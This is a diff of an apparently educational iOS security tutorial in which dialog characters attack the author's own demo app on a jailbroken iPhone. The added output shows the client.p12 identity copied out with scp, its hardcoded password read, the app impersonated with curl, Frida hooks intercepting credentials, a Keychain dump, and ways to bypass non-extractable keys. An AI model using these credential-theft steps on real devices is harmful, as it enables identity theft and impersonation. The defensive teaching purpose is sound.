@@ -32,7 +32,7 @@ Depends on who's accessing it.
 
 Today, Autolycus is going to break into our app. Three attacks, each targeting a different layer. By the end, he'll have stolen our client identity and used it to impersonate our iPhone from his laptop.
 
-Everything we're about to do requires a **jailbroken device** — an iPhone where the usual security boundaries (sandbox, code signing enforcement, filesystem protection) have been weakened. We're using an iPhone 6S running iOS 15.8.1, jailbroken with palera1n. If you want to follow along, you'll need a jailbroken device with SSH access.
+Everything we're about to do requires a **jailbroken device** — an iPhone where the usual security boundaries (sandbox, code signing enforcement, filesystem protection) have been weakened. We're using an iPhone 6S running iOS 15.8.7, jailbroken with palera1n. If you want to follow along, you'll need a jailbroken device with SSH access.
 
 {{% dialog "🦉 Menthor" %}}
 *Opens a rather alarming book.* A note before we proceed. What follows is a security demonstration on hardware you own. The techniques shown here — dynamic instrumentation, filesystem inspection, Keychain extraction — are standard tools of the iOS security research trade. They are used by penetration testers, security auditors, and Apple's own security team. Understanding the attack is a prerequisite for understanding the defense.
@@ -190,17 +190,18 @@ find /var/containers/Bundle/Application/ -name "TLSDemo.app" -type d
 ```
 
 ```
-[PLACEHOLDER: Something like /var/containers/Bundle/Application/A1B2C3D4-E5F6-7890-ABCD-EF1234567890/TLSDemo.app]
+/var/containers/Bundle/Application/D95D4934-F057-4D41-83D7-8C08EDBBFBA2/TLSDemo.app
 ```
 
 Now let's look inside:
 
 ```bash
-ls /var/containers/Bundle/Application/<uuid>/TLSDemo.app/
+ls /var/containers/Bundle/Application/D95D4934-F057-4D41-83D7-8C08EDBBFBA2/TLSDemo.app/
 ```
 
 ```
-[PLACEHOLDER: You'll see the app contents — binary, frameworks, resources. Including ca.der and client.p12]
+Info.plist  META-INF/  PkgInfo  TLSDemo*  TLSDemo.debug.dylib
+_CodeSignature/  __preview.dylib  ca.der  client.p12  embedded.mobileprovision
 ```
 
 There it is. `client.p12`. The client identity we use for mTLS, just sitting in the app bundle like a house key under the doormat.
@@ -209,10 +210,18 @@ There it is. `client.p12`. The client identity we use for mTLS, just sitting in 
 
 ```bash
 # From your Mac — copy the file out via SCP
-scp -P 2222 root@localhost:/var/containers/Bundle/Application/<uuid>/TLSDemo.app/client.p12 ./stolen.p12
+scp -P 2222 mobile@localhost:/var/containers/Bundle/Application/D95D4934-F057-4D41-83D7-8C08EDBBFBA2/TLSDemo.app/client.p12 ./stolen.p12
 ```
 
-We know the password is `"demo"` — we saw it in the source code. But even if we didn't, P12 passwords can be brute-forced. They're just encryption over a known format.
+{{% dialog "🦆 Nestor" %}}
+Wait — the P12 is encrypted, right? You need the password to open it.
+{{% /dialog %}}
+
+{{% dialog "🐦‍⬛ Autolycus" %}}
+Sure. But where's the password?
+{{% /dialog %}}
+
+In the source code. `CertificateHelper.loadIdentity(from: "client", password: "demo")`. The app has to know the password to open the P12 at runtime, so the password is compiled into the binary. An attacker can find it by running `strings` on the binary, or by hooking `SecPKCS12Import` with Frida and reading the arguments. And even without that — P12 passwords can be brute-forced. The encryption is just `pbeWithSHA1And3-KeyTripleDES-CBC` with 2048 iterations. Not exactly a fortress.
 
 Let's verify we got something real:
 
@@ -222,10 +231,18 @@ openssl pkcs12 -in stolen.p12 -info -passin pass:demo -nokeys
 ```
 
 ```
-[PLACEHOLDER: You should see certificate info including:
-subject=CN = demo-iphone, O = Demo
-issuer=CN = TLSDemo CA, O = Demo
-]
+MAC: sha1, Iteration 2048
+MAC length: 20, salt length: 16
+PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048
+Certificate bag
+Bag Attributes
+    localKeyID: 2B FD 55 1B 45 71 34 6F DE 8A 89 96 50 58 96 63 BD 07 BE CE
+subject=CN=demo-iphone, O=Demo
+issuer=CN=TLSDemo CA, O=Demo
+...
+Certificate bag
+subject=CN=TLSDemo CA, O=Demo
+issuer=CN=TLSDemo CA, O=Demo
 ```
 
 {{% dialog "🐦‍⬛ Autolycus" %}}
@@ -239,13 +256,11 @@ issuer=CN = TLSDemo CA, O = Demo
 curl --cacert certs/out/ca.pem \
      --cert stolen.p12:demo \
      --cert-type P12 \
-     https://<server-ip>:8444/secure
+     https://192.168.93.146:8444/secure
 ```
 
-```
-[PLACEHOLDER:
+```json
 {"auth":"mutual TLS (both sides verified)","client":"demo-iphone","message":"Hello demo-iphone, mutual trust established"}
-]
 ```
 
 {{% dialog "🦆 Nestor" %}}
@@ -370,23 +385,21 @@ frida -U -f com.demo.TLSDemo -l hook_delegate.js
 The `-f` flag tells Frida to **spawn** the app (launch it fresh) and pause it before any code runs. Our hook is injected, then the app resumes. When you tap "Connect" on the mTLS tab, you'll see:
 
 ```
-[PLACEHOLDER: Something like:
 [✓] Hooked TLSDemo.MTLSService → - URLSession:didReceiveChallenge:completionHandler:
 
 [*] ===== Authentication Challenge =====
 [*] Method: NSURLAuthenticationMethodServerTrust
-[*] Host:   <server-ip>
+[*] Host:   192.168.93.146
 [*] Port:   8444
-[*] Server trust object: <SecTrustRef: 0x...>
+[*] Server trust object: 0x283163840
 [*] (App will evaluate this against bundled CA)
 
 [*] ===== Authentication Challenge =====
 [*] Method: NSURLAuthenticationMethodClientCertificate
-[*] Host:   <server-ip>
+[*] Host:   192.168.93.146
 [*] Port:   8444
 [*] >>> Server is requesting client certificate <<<
 [*] The app will now present the P12 identity...
-]
 ```
 
 {{% dialog "🦆 Nestor" %}}
@@ -438,14 +451,12 @@ console.log("[✓] Credential interceptor active");
 ```
 
 ```
-[PLACEHOLDER:
 [✓] Credential interceptor active
 
 [*] ===== Client Credential Intercepted =====
-[*] Credential: <NSURLCredential: 0x...>
-[*] Identity:   <SecIdentityRef: 0x...>
+[*] Credential: <NSURLCredential: 0x281443be0>: (null)
+[*] Identity:   0x281607220
 [*] Has identity: YES
-]
 ```
 
 {{% dialog "🐦‍⬛ Autolycus" %}}
@@ -510,7 +521,7 @@ That's a real threat — an attacker could hook the trust evaluation to accept a
 You know what else is interesting? The Keychain.
 {{% /dialog %}}
 
-When our app calls `SecPKCS12Import`, it doesn't just parse the P12 in memory. It imports the private key and certificate into the iOS Keychain — Apple's secure credential store. This is how `SecIdentity` works under the hood: it's a reference to a Keychain item.
+Remember from Part 2 — our app imports the P12 on first launch and then stores the private key and certificate in the iOS Keychain with default flags. That's what a real app would do: provision once, reuse from the Keychain. The Keychain is Apple's secure credential store, and `SecIdentity` is a reference to items inside it.
 
 On a non-jailbroken device, each app can only see its own Keychain entries. But on a jailbroken device...
 
@@ -531,44 +542,25 @@ ios keychain dump
 ```
 
 ```
-[PLACEHOLDER: You should see output like:
-
-Class:        kSecClassIdentity
-Account:
-Service:
-Data:         <SecIdentityRef>
-Access Group: com.demo.TLSDemo
-Accessible:   kSecAttrAccessibleWhenUnlocked
-Extractable:  true
-
-Class:        kSecClassCertificate
-Account:
-Label:        demo-iphone
-Data:         <certificate data in hex>
-Access Group: com.demo.TLSDemo
-
-Class:        kSecClassKey
-Account:
-Label:        demo-iphone
-Type:         EC (P-256)
-Size:         256
-Extractable:  true
-Data:         <private key data in hex>
-]
+Created                    Accessible    ACL   Type                  Account  Service  Data
+-------------------------  ------------  ----  --------------------  -------  -------  ------------------------
+2026-04-28 21:56:35 +0000  WhenUnlocked  None  kSecClassKey                            (Key data not displayed)
+2026-04-28 21:56:35 +0000  WhenUnlocked  None  kSecClassIdentity
+2026-04-28 21:56:35 +0000  WhenUnlocked  None  kSecClassCertificate
 ```
 
 {{% dialog "🐦‍⬛ Autolycus" %}}
-See that? `Extractable: true`. That means I can read the raw private key bytes. Not just a reference to it. The actual key.
+See that? Three items. `WhenUnlocked`. ACL: `None`. The private key, the certificate, and the identity — all sitting in the Keychain with no access control beyond "is the phone unlocked?"
 {{% /dialog %}}
 
 {{% dialog "🦆 Nestor" %}}
-Why is it extractable?!
+But it's the *Keychain*. That's supposed to be secure!
 {{% /dialog %}}
 
 ### Why this works
 
 {{% dialog "🦉 Menthor" %}}
-Because that's the default.
+Secure against *other apps*, yes. But not against code running *inside your own process*.
 {{% /dialog %}}
 
 {{% dialog "🦉 Menthor" %}}
@@ -581,7 +573,7 @@ The iOS Keychain has several access control flags that govern how items are stor
 | `kSecAttrIsExtractable` | `true` | Whether the raw key data can be exported |
 
 {{% dialog "🦉 Menthor" %}}
-When `SecPKCS12Import` imports a private key into the Keychain, it uses the default flags. The key is marked as extractable. This means any code running in the app's process — including Frida's injected JavaScript — can call `SecItemCopyMatching` with `kSecReturnData: true` and receive the raw key bytes.
+When we stored the private key with `SecItemAdd`, we didn't set `kSecAttrIsExtractable` to `false` — so it defaults to `true`. That means any code running in the app's process — including Frida's injected JavaScript — can call `SecItemCopyMatching` with `kSecReturnData: true` and receive the raw key bytes.
 {{% /dialog %}}
 
 {{% dialog "🦉 Menthor" %}}
@@ -614,6 +606,26 @@ graph TD
 The Keychain can't tell the difference between the app asking for the key and *me* asking for the key. Because we're in the same process. I'm wearing the app's clothes.
 {{% /dialog %}}
 
+{{% dialog "🦆 Nestor" %}}
+What if we set `kSecAttrIsExtractable` to `false`? Then you can't read the key bytes, right?
+{{% /dialog %}}
+
+{{% dialog "🦉 Menthor" %}}
+That would prevent `SecItemCopyMatching` from returning the raw key data, yes. The key could still be *used* for signing via `SecKeyCreateSignature`, but the bytes themselves would not be readable.
+{{% /dialog %}}
+
+{{% dialog "🐦‍⬛ Autolycus" %}}
+Nice try. But `kSecAttrIsExtractable` is a software flag, enforced by the Security framework. On a jailbroken device, I can hook `SecItemCopyMatching` and bypass the check. Or I can skip extraction entirely — hook `SecKeyCreateSignature` and use the key to sign whatever I want while the app is running. I can't *steal* the key, but I can *borrow* it for as long as the app is alive.
+{{% /dialog %}}
+
+{{% dialog "🦆 Nestor" %}}
+So even non-extractable keys aren't safe?
+{{% /dialog %}}
+
+{{% dialog "🦉 Menthor" %}}
+Not on a compromised device. The flag is a policy enforced in software. If the attacker controls the process, they control the policy. You need a mechanism where the key *physically cannot leave* — where even the app itself never touches the raw key material. That's a hardware problem, not a software one.
+{{% /dialog %}}
+
 ## The proof
 
 {{% dialog "🐦‍⬛ Autolycus" %}}
@@ -637,7 +649,7 @@ But the headline is simple: **we can extract the client identity and use it from
 curl --cacert certs/out/ca.pem \
      --cert stolen.p12:demo \
      --cert-type P12 \
-     https://<server-ip>:8444/secure
+     https://192.168.93.146:8444/secure
 ```
 
 ```json
